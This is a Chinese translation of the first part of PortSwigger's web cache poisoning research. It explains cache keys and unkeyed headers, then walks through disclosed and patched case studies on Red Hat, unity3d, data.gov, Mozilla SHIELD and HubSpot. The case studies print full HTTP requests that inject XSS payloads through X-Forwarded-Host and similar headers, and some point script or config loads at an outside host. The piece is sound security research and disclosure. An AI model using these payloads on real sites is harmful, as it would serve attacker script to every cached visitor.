> 原文链接: https://www.anquanke.com//post/id/156356 


# 实战Web缓存投毒（上）


                                阅读量   
                                **417453**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：portswigger.net
                                <br>原文地址：[https://portswigger.net/blog/practical-web-cache-poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)

译文仅供参考，具体内容表达以及含义原文为准

<!--EndFragment-->

[![](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)](https://p2.ssl.qhimg.com/t014482c00a2979d21e.png)

## 前言

## <!--StartFragment--> <!--EndFragment-->

由于这整篇文章的篇幅较大，并且内容较深，我决定将原文拆分成两部分进行翻译：第一部分涉及投毒的基本原理和几个投毒的案例；第二部分涉及投毒的案例、解决办法和结论



## 摘要

长期以来，web缓存投毒都是一个被人遗忘的漏洞，一种用于吓唬开发人员乖乖修复但是无人可实际利用的“理论”上的威胁。

在本文中，我将向大家展示如何通过使用深奥的web特性来将它们的缓存系统转变为漏洞利用代码（exploit）投放系统，每一位错误访问他们主页的用户都是这种攻击的目标。

<!--StartFragment--> <!--EndFragment-->

我将结合让我我能够控制大量流行网站和架构的漏洞来说明和进一步扩展这种技术，从简单的单一请求攻击到劫持javascript，越过缓存层，颠覆社交媒体，误导云服务的复杂漏洞利用链。这篇文章也提供[pdf格式](https://portswigger.net/kb/papers/7q1e9u9a/web-cache-poisoning.pdf)，它同时是我的[Black Hat USA presentation](https://www.blackhat.com/us-18/briefings/schedule/index.html#practical-web-cache-poisoning-redefining-unexploitable-10200)，因此幻灯片和视频将在适当的时候提供。



## 核心概念

<!--StartFragment--> <!--EndFragment-->

### 缓存概念介绍（Caching 101）

<!--StartFragment-->要掌握缓存投毒技术，我们需要快速了解缓存的基本原理。 Web缓存位于用户和应用程序服务器之间，用于保存和提供某些响应的副本。在下图中，我们可以看到三个用户一个接一个地获取相同的资源：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/d8/e5/22a1637dd763-article-cache.svg)

缓存技术旨在通过减少延迟来加速页面加载，还可以减少应用程序服务器上的负载。一些公司使用像Varnish这样的软件来托管他们自己的缓存，而其他公司选择依赖像Cloudflare这样的内容分发网络（CDN），缓存分布在世界各地。此外，一些流行的Web应用程序和框架（如Drupal）具有内置缓存。

<!--StartFragment--> <!--EndFragment-->

还有其他类型的缓存，例如客户端浏览器缓存和DNS缓存，但它们不是本次研究的关注点。

### <!--StartFragment-->缓存键（Cache keys）<!--EndFragment-->

缓存的概念可能听起来简单明了，但它隐藏了一些有风险的假设。每当缓存服务收到对资源的​​请求时，它需要确定它是否已经保存了这个指定资源的副本，并且可以使用该副本进行响应，或者是否需要将请求转发给应用程序服务器。

<!--StartFragment--> <!--EndFragment-->

确定两个请求是否正在尝试加载相同的资源可能是很棘手的问题;对请求进行逐字节匹配的做法是完全无效的，因为HTTP请求充满了无关紧要的数据，例如请求头中的User-Agent字段：

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close
```

缓存使用缓存键的概念解决了这个问题 – 使用一些特定要素用于完全标识所请求的资源。在上面的请求中，我用橙色高亮了典型的缓存键中包含的值。

<!--StartFragment-->

这意味着缓存系统认为以下两个请求是等效的，并且将很乐意的使用从第一个请求缓存的响应来响应第二个请求：

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```

因此，该页面将以错误的语言输出提供给第二位访问者。这揭示了以下的问题-由非缓存键导致的差异化响应都能够被存储并提供给其他用户。理论上来说，网站可以使用“Vary”响应头来指定额外应该加入到缓存键中的其他请求头。在实践中，对Vary响应头的使用仅停留在理论阶段，像Cloudflare这样的CDN完全忽略它，大家甚至没有意识到他们的应用程序支持任何基于请求头的输入。

这会导致大量意外的破坏，但当有人故意开始利用它时，这种乐趣才真正开始。

### <!--StartFragment-->缓存投毒（Cache Poisoning）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

Web缓存投毒的目的是发送导致有害响应的请求，将该响应将保存在缓存服务中并提供给其他用户。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/99/13/6505c296bdf4-article-cachepoisoningattack.svg)

<!--StartFragment--> <!--EndFragment-->

在本文中，我们将使用不在缓存键中的输入（如HTTP请求头）来实现缓存投毒，这不是缓存投毒的唯一方法-你也可以使用HTTP响应拆分攻击和[Request Smuggling攻击](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf)–但我认为本文讨论是最好的方法。请注意，Web缓存服务中还存在一种称为[Web缓存欺骗](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)的不同类型的攻击，不要和缓存投毒弄混了。

### <!--StartFragment-->方法（Methodology）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

我们将使用以下方法发现缓存投毒漏洞：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://portswigger.net/cms/images/ec/b8/0d97faa475af-article-methodology-full-landscape.svg)

<!--StartFragment--> <!--EndFragment-->

我将会先给出一个快速概述，然后在真实的网站演示漏洞如何生效，而不是试图在一开始就深入解析具体的技术细节。

<!--StartFragment-->第一步是识别非缓存键的输入。手动执行此操作非常繁琐，因此我开发了一个名为[Param Miner](https://github.com/PortSwigger/param-miner)的Burp Suite开源插件，通过猜测header/ cookie名称来自动执行此步骤，并观察它们是否对应用程序的响应产生影响。<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

在找到非缓存键输入之后，接下来的步骤就是去评估你可以造成多大的危害，然后尝试将其存储在缓存中，如果失败了，你需要更好地了解缓存的工作方式，并在重试之前搜索可缓存的目标页面。页面是否被缓存可以基于多种因素，包括文件扩展名，内容类型，路由，状态代码和响应头。

<!--StartFragment--> <!--EndFragment-->

缓存的响应有可能掩盖住非缓存键的输入，因此如果您尝试手动检测或发现非缓存键的输入，一个缓存爆破工具（cache-buster）就是十分重要的了。如果加载了Param Miner，则可以通过向查询字符串添加值为随机（$ randomplz）的参数来确保每个请求都具有唯一的缓存键。

<!--StartFragment--> <!--EndFragment-->

在审计线上网站时，意外投毒对其他访问者来说是一种永久性危害。 Param Miner通过向来自Burp的所有出站请求添加缓存破坏（cache buster）来缓解这种情况。此缓存爆破工具具有固定值，因此您可以自己观察缓存行为，而不会影响其他用户。



## 实例研究（Case Studies）

让我们来看看这项技术应用于真实的线上网站时会发生什么。像往常一样，我特意选择对安全人员的测试有友好政策的网站。这里讨论的所有漏洞都已上报和被修补，但由于项目的“非公开”性质，我不得不去编纂一部分的内容。

<!--StartFragment--> <!--EndFragment-->

其中许多案例研究在非缓存键输入的同时利用了XSS等辅助漏洞，谨记，如果没有缓存投毒漏洞，这些漏洞就没用了，因为没有可靠的方法强制其他用户在跨域请求中发送自定义请求头。这可能就是这些辅助漏洞如此容易发现的原因。

### <!--StartFragment-->基本投毒概念（Basic Poisoning）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

尽管缓存投毒听起来有着可怕的影响，但缓存投毒通常很容易被利用。首先，让我们来看看Red Hat的主页。 Param Miner马上发现了一个非缓存键的输入：

```
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
&lt;meta property="og:image" content="https://canary/cms/social.png" /&gt;
```

<!--StartFragment-->

在这里，我们可以看到应用程序使用X-Forwarded-Host请求头在meta标签内生成了一个打开图片的URL。下一步是探索它是否可利用 – 我们将从一个简单的[跨站点脚本](https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected)payload开始：

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
&lt;meta property="og:image" content="https://a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/&gt; 
```

<!--StartFragment-->

<!--EndFragment-->

<!--EndFragment-->

<!--StartFragment-->

看起来不错 – 现在可以确定我们可以生成一个在任何浏览者的页面上执行任意javascript的响应。最后一步是检查此响应是否已存储在缓存服务中，以便将其分发给其他用户。不要让“Cache Control: no-cache”响应头阻止你 – 尝试去攻击总比假设它不起作用更好。你可以先通过重新发送没有恶意标头的请求进行验证，然后直接在另一台计算机上的浏览器中访问URL：

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com

HTTP/1.1 200 OK
…
&lt;meta property="og:image" content="https://a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/&gt;
```

尽管响应中没有任何表明缓存存在的响应头，但我们的漏洞利用代码（exploit）已经被明确的缓存的原因很简单：一次快速 的DNS查询解释了其中的缘由-www.redhat.com是www.redhat.com.edgekey.net的CNAME记录，表明它正在使用Akamai的CDN。

### <!--StartFragment-->确定投毒时机（Discreet poisoning）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

在这一点上，我们已经证明可以通过向https://www.redhat.com/en?dontpoisoneveryone=1投毒来进行攻击，以避免影响网站的实际的访问者。为了真正的向博客的主页投毒并将我们的漏洞利用代码（exploit）分发给所有后续访问者，我们需要确保在缓存的响应过期后我们发送的请求第一个达到主页。

<!--EndFragment-->

可以尝试使用像Burp Intruder或自定义脚本之类的工具来发送大量请求，但这种笨重的方法是收效甚微的。攻击者可以通过对目标的缓存到期系统进行逆向工程并通过浏览文档和监控网站来预测准确的到期时间来解决这个问题，但这听起来就像是一项艰苦的工作。<!--StartFragment--><br>
幸运的是，许多网站让我们的漏洞人生简单许多。看看unity3d.com中的缓存投毒漏洞：

```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
…
&lt;script src="https://portswigger-labs.net/sites/files/foo.js"&gt;&lt;/script&gt;
```

<!--StartFragment--> <!--EndFragment-->

在请求头中，我们有一个非缓存键输入 – X-Host请求头 – 被用于生成一个脚本导入的标签。响应头“Age”和“max-age”分别指定当前响应的时间和它将过期的时间。总之，这些告诉我们为确保我们的响应被缓存，我们应该发送的payload的确切时间。

### <!--StartFragment-->选择性投毒（Selective Poisoning）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

HTTP响应头节省了解缓存的内部工作原理的时间。拿下面这个是用了fastly cdn服务的著名网站举例：

```
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 … Firefox/60.0
X-Forwarded-Host: a"&gt;&lt;iframe onload=alert(1)&gt;

HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
&lt;link rel="canonical" href="https://a"&gt;a&lt;iframe onload=alert(1)&gt;
&lt;/iframe&gt; 
```

乍一看起来似乎与第一个例子是一样的。但是，Vary响应头告诉我们User-Agent头可能是缓存键的一部分，手工测试也证实了这一点。这意味着，因为我们声明使用的是Firefox 60，我们的漏洞利用代码（exploit）只会分发给其他Firefox 60用户。我们可以使用一系列受欢迎的User-Agent来确保大多数访问者将会接收到我们的漏洞利用代码（exploit），但这种表现使得我们可以更具选择性的去实施攻击。如果你知道了受害者的User-Agent，则可以向特定人员定制攻击，甚至可以在网站监控团队面前隐藏自己。

<!--StartFragment-->

<!--EndFragment-->

<!--EndFragment-->

<!--EndFragment-->

### <!--StartFragment-->DOM 投毒（DOM Poisoning）<!--EndFragment-->

<!--StartFragment-->成功利用非缓存键的输入并不总是像复制黏贴xss payload那样简单，看下面这个例子：<!--EndFragment-->

```
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
&lt;body data-site-root="https://canary/"&gt;
```

我们已经控制了’data-site-root’属性，但我们不能找到获得XSS的突破口，并且甚至不清楚这个属性的作用是什么。为了找到答案，我在Burp中创建了一个匹配然后替换的规则，为所有请求添加了“X-Forwarded-Host：id.burpcollaborator.net”请求头，然后浏览了该站点。当加载特定页面时，Firefox会将JavaScript生成的请求发送到我的服务器：

```
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

这条请求记录表明，在网站的某个地方，有一些JavaScript代码使用data-site-root的属性来确定从哪里加载一些网站语言的数据。我试图通过访https://catalog.data.gov/api/i18n/en来找出这些数据应该是什么样的，但只是收到了一个空的JSON响应。幸运的是，将’en’改为’es’的行为抛出了一丝丝线索：

```
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov

HTTP/1.1 200 OK
…
`{`"Show more":"Mostrar más"`}`
```

<!--StartFragment-->该文件包含用于将短语翻译为用户所选语言的映射。通过创建我们自己的翻译文件并使用指向用户的缓存投毒，我们可以将短语翻译变成漏洞利用代码（exploit）：<!--EndFragment-->

```
GET  /api/i18n/en HTTP/1.1
Host: portswigger-labs.net

HTTP/1.1 200 OK
...
`{`"Show more":"&lt;svg onload=alert(1)&gt;"`}`
```

这就是最终结果？任何查看包含“显示更多”文字的网页的人都会被利用。

### <!--StartFragment-->劫持Mozilla SHIELD（Hijacking Mozilla SHIELD）<!--EndFragment-->

<!--StartFragment-->我配置的“X-Forwarded-Host”匹配/替换规在帮助我解决上一个漏洞利用问题的同时产生意想不到的额外效果。除了来自catalog.data.gov的交互之外，我还收到了一段非常神秘的内容：<!--EndFragment-->

```
GET /api/v1/recipe/signed/ HTTP/1.1
Host: xyz.burpcollaborator.net
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: application/json
origin: null
X-Forwarded-Host: xyz.burpcollaborator.net
```

[自身发出origin:null的请求头](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)情况非常的少见，我以前从未见过浏览器发出完全小写的Origin请求头。通过筛选proxy历史记录，发现罪魁祸首是Firefox本身。 Firefox会试图获取一份“recipes”列表，作为[SHIELD](https://wiki.mozilla.org/Firefox/Shield)系统的一部分，用于静默安装扩展以用于营销和研究目的。该系统曾因强行分发“Mr Robot’”扩展而闻名，[引起了用户的强烈不满](https://www.cnet.com/news/mozilla-backpedals-after-mr-robot-firefox-misstep/)。无论如何，看起来X-Forwarded-Host请求头欺骗了这个系统，将Firefox引导到我自己的网站以获取recipes：

```
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net

HTTP/1.1 200 OK
`{`
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
   …
`}`
```

recipes看起来是这样的：

```
[`{`
  "id": 403,
  "last_updated": "2017-12-15T02:05:13.006390Z",
  "name": "Looking Glass (take 2)",
  "action": "opt-out-study",
  "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  "filter_expression": "normandy.country in  ['US', 'CA']\n &amp;&amp; normandy.version &gt;= '57.0'\n)",
  "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
`}`]
```

该系统使用NGINX进行缓存，自然很乐意保存我投毒的响应并将其提供给其他用户。 Firefox在浏览器打开后不久就会抓取此URL并定期重新获取它，最终意味着所有数以千万的Firefox日常用户最终都可能从我的网站上获取recipes。

<!--StartFragment-->

<!--EndFragment-->

这提供了多种可能。 Firefox所使用的recipes已经做了[签名](https://github.com/mozilla-services/autograph/tree/master/signer/contentsignature)，所以我不能通过只安装恶意插件然后获得完整的代码执行，但我可以将数以千万的真正用户指向我选择的URL。显而易见，这除了可以被利用于DDoS，如果适当的和内存损坏漏洞相结合，这将是非常严重的问题。此外，一些后端Mozilla系统使用非签名的recipes，这可以被用于在其基础设施内部获得稳定的切入点并可能获得recipes的签名密钥。此外，我可以重放我选择的旧recipes，这可能会大规模的强制安装旧包含知有漏洞的扩展，或者导致‘Mr Robot’的意外回归。

<!--StartFragment-->

<!--EndFragment-->

<!--StartFragment-->

我向Mozilla报告了这一问题，他们在24小时内修补了他们的基础设施，但是在漏洞的严重程度上存在一些分歧，因此只获得了1000美元的奖励。

<!--EndFragment-->

### <!--StartFragment-->路由投毒（Route poisoning）<!--EndFragment-->

<!--StartFragment--> <!--EndFragment-->

有些应用程序不仅无知地使用请求头生成URL，而且无知地将它们用于内部请求路由：

```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: canary

HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
…
&lt;title&gt;HubSpot - Page not found&lt;/title&gt;
&lt;p&gt;The domain canary does not exist in our system.&lt;/p&gt;
```

Goodhire.com显然是托管在HubSpot上的，而HubSpot提供优先级高于主机host 请求头的X-Forwarded-Server请求头，并且疑惑于这个请求用于哪个用户。虽然我们的输入在响应页面种回显，但它是HTML编码的，所以直接的XSS攻击在这里不起作用。要成功利用这一点，我们需要访问hubspot.com，注册为HubSpot用户，在我的HubSpot主页上放置一个payload，并且最终欺骗HubSpot在goodhire.com上提供此响应：

```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com

HTTP/1.1 200 OK
…
&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

Cloudflare将乐意缓存此响应，并将其提供给后续访问者。 然而在将此报告上交给HubSpot之后，HubSpot通过永久封掉我的IP地址来解决问题。经过一番鼓动后，他们还是修补了漏洞。

<!--StartFragment-->

像这样的内部错误路由漏洞在这些单个系统处理针对许多不同客户的请求的应用程序（SaaS应用程序）中特别常见。
